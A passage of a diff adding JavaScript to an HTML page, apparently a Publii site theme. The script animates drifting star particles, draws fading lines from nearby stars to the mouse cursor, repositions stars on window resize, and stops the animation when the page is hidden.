+    function animate() {
+
+        const width = window.innerWidth;
+        const height = window.innerHeight;
+
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            /*
+             * Move dust
+             */
+            star.x += star.vx;
+            star.y += star.vy;
+
+            /*
+             * Wrap around screen edges
+             */
+            if (star.x < -10) {
+                star.x = width + 10;
+            }
+
+            if (star.x > width + 10) {
+                star.x = -10;
+            }
+
+            if (star.y < -10) {
+                star.y = height + 10;
+            }
+
+            if (star.y > height + 10) {
+                star.y = -10;
+            }
+
+            /*
+             * Move particle
+             */
+            star.element.style.transform =
+                "translate3d(" +
+                star.x +
+                "px," +
+                star.y +
+                "px,0)";
+        }
+
+        animationFrame = requestAnimationFrame(animate);
+    }
+
+    animate();
+
+    /* ================================
+       MOUSE CONNECTIONS
+       ================================ */
+
+    /*
+     * Instead of permanently creating 800 lines,
+     * we create them only when needed.
+     */
+
+    let lastLineUpdate = 0;
+
+    function updateConnections(timestamp) {
+
+        /*
+         * Limit line calculations to about 30fps.
+         * This keeps 800 particles smooth.
+         */
+        if (timestamp - lastLineUpdate < 33) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        lastLineUpdate = timestamp;
+
+        /*
+         * Delete old connection lines.
+         */
+        const oldLines =
+            space.querySelectorAll(
+                ".publii-star-line"
+            );
+
+        oldLines.forEach(function (line) {
+            line.remove();
+        });
+
+        /*
+         * No mouse = no connections.
+         */
+        if (mouseX < 0 || mouseY < 0) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        /*
+         * Find stars close to mouse.
+         */
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            const dx = star.x - mouseX;
+            const dy = star.y - mouseY;
+
+            const distance =
+                Math.sqrt(dx * dx + dy * dy);
+
+            if (distance <= MOUSE_RADIUS) {
+
+                /*
+                 * Only connect fairly close stars
+                 * to the mouse.
+                 */
+                const line =
+                    document.createElement("span");
+
+                line.className =
+                    "publii-star-line";
+
+                const angle =
+                    Math.atan2(
+                        star.y - mouseY,
+                        star.x - mouseX
+                    ) * 180 / Math.PI;
+
+                line.style.left =
+                    mouseX + "px";
+
+                line.style.top =
+                    mouseY + "px";
+
+                line.style.width =
+                    distance + "px";
+
+                line.style.transform =
+                    "rotate(" + angle + "deg)";
+
+                /*
+                 * Closer = brighter.
+                 */
+                const opacity =
+                    1 - distance / MOUSE_RADIUS;
+
+                line.style.opacity =
+                    (opacity * 0.7).toFixed(2);
+
+                space.appendChild(line);
+            }
+        }
+
+        requestAnimationFrame(updateConnections);
+    }
+
+    requestAnimationFrame(updateConnections);
+
+    /* ================================
+       RESIZE
+       ================================ */
+
+    window.addEventListener(
+        "resize",
+        function () {
+
+            /*
+             * Keep stars inside the new viewport.
+             */
+            const width = window.innerWidth;
+            const height = window.innerHeight;
+
+            stars.forEach(function (star) {
+
+                if (star.x > width) {
+                    star.x = Math.random() * width;
+                }
+
+                if (star.y > height) {
+                    star.y = Math.random() * height;
+                }
+            });
+        }
+    );
+
+    /* ================================
+       CLEANUP
+       ================================ */
+
+    window.addEventListener(
+        "pagehide",
+        function () {
+            cancelAnimationFrame(animationFrame);
+        }
+    );
+
+})();</script></body></html>
